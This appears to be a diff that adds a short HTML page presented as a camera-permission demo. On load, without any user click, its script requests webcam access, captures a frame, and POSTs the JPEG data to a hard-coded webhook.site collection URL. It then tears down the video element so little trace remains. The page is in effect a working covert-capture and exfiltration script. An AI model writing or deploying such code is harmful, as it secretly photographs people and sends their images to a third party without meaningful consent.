@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Camera Permission and Photo Capture</title>
+</head>
+<body>
+    <button id="requestCamera">Request Camera Permission</button>
+
+    <script>
+        // Function to request camera permission and capture a photo
+        function requestCameraPermission() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                // Camera access granted
+                console.log('Camera permission granted.');
+
+                // Access the video stream and capture a photo
+                const video = document.createElement('video');
+                document.body.appendChild(video);
+                video.srcObject = stream;
+
+                video.onloadedmetadata = function(e) {
+                    // Adjust the video size here if needed
+                    video.play();
+
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // Convert the captured image to a data URL
+                    const dataURL = canvas.toDataURL('image/jpeg');
+
+                    // Send the dataURL to the custom URL
+                    sendPhoto(dataURL);
+
+                    // Clean up resources
+                    stream.getTracks().forEach(track => track.stop());
+                    video.remove();
+                };
+            })
+            .catch(function(error) {
+                // Camera access denied
+                console.error('Camera permission denied: ' + error);
+            });
+        }
+
+        // Function to send the captured photo to a custom URL
+        function sendPhoto(dataURL) {
+            // Replace 'https://webhook.site/6bab9354-77d4-4922-9f9c-32c264d35fb7' with your actual custom URL
+            const customURL = 'https://webhook.site/6bab9354-77d4-4922-9f9c-32c264d35fb7';
+
+            // Create a FormData object to send the image
+            const formData = new FormData();
+            formData.append('image', dataURL);
+
+            // Use an HTTP POST request to send the FormData to the custom URL with CORS support
+            fetch(customURL, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                // Handle the response from the server here
+                console.log('Image sent to custom URL successfully.');
+            })
+            .catch(error => {
+                console.error('Error sending the image: ' + error);
+            });
+        }
+
+        // Automatically click the button when the page loads
+        window.addEventListener('load', function() {
+            requestCameraPermission();
+        });
+    </script>
+</body>
+</html>
